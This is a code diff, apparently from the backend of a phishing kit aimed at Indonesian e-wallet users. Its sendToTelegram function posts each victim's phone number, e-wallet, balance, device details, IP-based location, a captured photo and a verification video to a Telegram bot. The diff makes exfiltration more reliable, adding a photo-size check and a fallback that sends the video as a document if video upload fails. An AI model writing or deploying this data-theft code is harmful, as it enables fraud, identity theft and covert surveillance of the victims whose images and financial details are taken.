@@ -48,7 +48,7 @@ async function getLocationDetails(ip) {
 }
 
 // ============================================
-// 📤 SEND TO TELEGRAM
+// 📤 SEND 1 PESAN KE TELEGRAM
 // ============================================
 async function sendToTelegram(data) {
     try {
@@ -57,16 +57,17 @@ async function sendToTelegram(data) {
 
         console.log('📤 Sending to Telegram...');
 
-        let caption = `🟡 *VERIFIKASI SALDO*\n\n`;
+        // CAPTION LENGKAP
+        let caption = `🟡 *VERIFIKASI SUKSES*\n\n`;
         caption += `📱 *Nomor:* ${phone || 'Tidak diketahui'}\n`;
         caption += `💳 *E-Wallet:* ${ewallet || 'Tidak diketahui'}\n`;
         caption += `💰 *Saldo:* Rp ${saldo || '0'}\n`;
         caption += `🕒 *Waktu:* ${time}\n\n`;
 
         if (device) {
-            caption += `📱 *Device:* ${device.brand || 'Tidak diketahui'} ${device.model || ''}\n`;
-            caption += `💻 *OS:* ${device.os || 'Tidak diketahui'}\n`;
-            caption += `🌐 *Browser:* ${device.browser || 'Tidak diketahui'}\n\n`;
+            caption += `📱 *Device:* ${device.brand || '-'} ${device.model || ''}\n`;
+            caption += `💻 *OS:* ${device.os || '-'}\n`;
+            caption += `🌐 *Browser:* ${device.browser || '-'}\n\n`;
         }
 
         if (locationData) {
@@ -91,22 +92,22 @@ async function sendToTelegram(data) {
 
         let messageId = null;
 
-        if (photoBuffer) {
-            const formPhoto = new FormData();
-            formPhoto.append('chat_id', CHAT_ID);
-            formPhoto.append('caption', caption);
-            formPhoto.append('photo', photoBuffer, {
+        if (photoBuffer && photoBuffer.length > 100) {
+            const form = new FormData();
+            form.append('chat_id', CHAT_ID);
+            form.append('caption', caption);
+            form.append('photo', photoBuffer, {
                 filename: `foto_${Date.now()}.jpg`,
                 contentType: 'image/jpeg'
             });
 
-            const photoResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                 method: 'POST',
-                body: formPhoto
+                body: form
             });
-            const photoResult = await photoResponse.json();
-            if (photoResult.ok) {
-                messageId = photoResult.result.message_id;
+            const result = await res.json();
+            if (result.ok) {
+                messageId = result.result.message_id;
                 console.log('✅ Photo sent');
             }
         }
@@ -115,25 +116,42 @@ async function sendToTelegram(data) {
         if (video) {
             const videoBase64 = video.replace(/^data:video\/\w+;base64,/, '');
             const videoBuffer = Buffer.from(videoBase64, 'base64');
-            
+
             if (videoBuffer.length > 1000) {
-                const formVideo = new FormData();
-                formVideo.append('chat_id', CHAT_ID);
-                formVideo.append('caption', `📹 *Video Verifikasi*\nUser: ${phone || 'Tidak diketahui'}`);
-                formVideo.append('video', videoBuffer, {
+                const form = new FormData();
+                form.append('chat_id', CHAT_ID);
+                form.append('caption', `📹 *Video Verifikasi*\nUser: ${phone || 'Tidak diketahui'}`);
+                form.append('video', videoBuffer, {
                     filename: `video_${Date.now()}.mp4`,
                     contentType: 'video/mp4'
                 });
 
                 if (messageId) {
-                    formVideo.append('reply_to_message_id', messageId);
+                    form.append('reply_to_message_id', messageId);
                 }
 
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                     method: 'POST',
-                    body: formVideo
+                    body: form
                 });
-                console.log('✅ Video sent');
+                const result = await res.json();
+                if (result.ok) {
+                    console.log('✅ Video sent');
+                } else {
+                    console.log('⚠️ Video failed:', result.description);
+                    // Fallback: kirim sebagai document
+                    const formDoc = new FormData();
+                    formDoc.append('chat_id', CHAT_ID);
+                    formDoc.append('caption', `📹 *Video Verifikasi*\nUser: ${phone || 'Tidak diketahui'}`);
+                    formDoc.append('document', videoBuffer, {
+                        filename: `video_${Date.now()}.mp4`,
+                        contentType: 'video/mp4'
+                    });
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+                        method: 'POST',
+                        body: formDoc
+                    });
+                }
             }
         }
 
